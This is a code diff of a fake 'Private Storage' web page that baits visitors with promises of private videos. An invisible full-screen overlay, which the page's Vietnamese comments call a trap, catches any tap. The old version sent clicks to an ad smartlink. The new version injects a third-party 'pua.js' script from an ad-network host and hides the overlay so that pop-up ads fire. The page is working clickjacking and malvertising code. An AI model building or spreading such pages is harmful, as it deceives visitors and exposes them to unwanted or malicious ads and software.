@@ -2,20 +2,23 @@
 <html lang="en">
 <head>
     <meta name="monetag" content="1837fb4126ec89a1418c29b34d11ca20">
+
     <script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "vt9wri82up");
-</script>
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "vt9wri82up");
+    </script>
+
+    <script src="https://alwingulla.com/88/pua.js" data-pua="10709363"></script>
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Private Storage - Cloud Access</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #0f172a; color: #e2e8f0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }
+        body { background-color: #0f172a; color: #e2e8f0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow-x: hidden; }
         
         /* Bẫy tàng hình phủ toàn màn hình */
         #trap {
@@ -39,25 +42,14 @@
             display: flex;
             align-items: center;
             border: 1px solid #334155;
-            transition: background 0.2s;
         }
         
-        .folder-item:active { background: #475569; }
         .icon { font-size: 24px; margin-right: 15px; }
         .info { flex-grow: 1; }
         .info .name { font-weight: bold; font-size: 15px; margin-bottom: 4px; display: block; letter-spacing: 0.5px; }
         .info .meta { font-size: 12px; color: #94a3b8; }
         
-        .badge {
-            background: #ef4444;
-            color: white;
-            font-size: 10px;
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-weight: bold;
-            text-transform: uppercase;
-            margin-left: 8px;
-        }
+        .badge { background: #ef4444; color: white; font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: bold; text-transform: uppercase; margin-left: 8px; }
 
         .btn-main {
             margin-top: 25px;
@@ -71,7 +63,6 @@
             letter-spacing: 1px;
             box-shadow: 0 4px 14px 0 rgba(37, 99, 235, 0.39);
         }
-        .btn-main:active { background: #1d4ed8; }
         .footer-text { text-align: center; margin-top: 20px; font-size: 11px; color: #475569; }
     </style>
 </head>
@@ -93,7 +84,6 @@
                     <span class="meta">542 Files • 1.2 GB • Updated 2h ago</span>
                 </div>
             </div>
-
             <div class="folder-item">
                 <div class="icon">📁</div>
                 <div class="info">
@@ -101,15 +91,6 @@
                     <span class="meta">128 Files • 856 MB • Private Access</span>
                 </div>
             </div>
-
-            <div class="folder-item">
-                <div class="icon">📁</div>
-                <div class="info">
-                    <span class="name">M45TUR8AT3_H1DD3N</span>
-                    <span class="meta">85 Files • 420 MB • Encryption Active</span>
-                </div>
-            </div>
-
             <div class="folder-item">
                 <div class="icon">📁</div>
                 <div class="info">
@@ -120,20 +101,14 @@
         </div>
 
         <div class="btn-main">DOWNLOAD 1000+ VIDS</div>
-        <p class="footer-text">Secure Cloud Encryption © 2026. IP Registered in Brazil.</p>
+        <p class="footer-text">Secure Cloud Encryption © 2026. IP Registered.</p>
     </div>
 
     <script>
-        const smartlink = "https://www.effectivegatecpm.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";
-        const overlay = document.getElementById('trap');
-
-        // Bẫy chính: Chuyển hướng trang hiện tại sang Smartlink
-        overlay.addEventListener('click', function() {
-            window.location.href = smartlink;
-        });
-
-        document.querySelector('.btn-main').addEventListener('click', function() {
-            window.location.href = smartlink;
+        const trap = document.getElementById('trap');
+        // Khi khách chạm bất cứ đâu, lớp phủ biến mất để nổ ads từ Monetag MultiTag
+        trap.addEventListener('click', function() {
+            trap.style.display = 'none';
         });
     </script>
 </body>
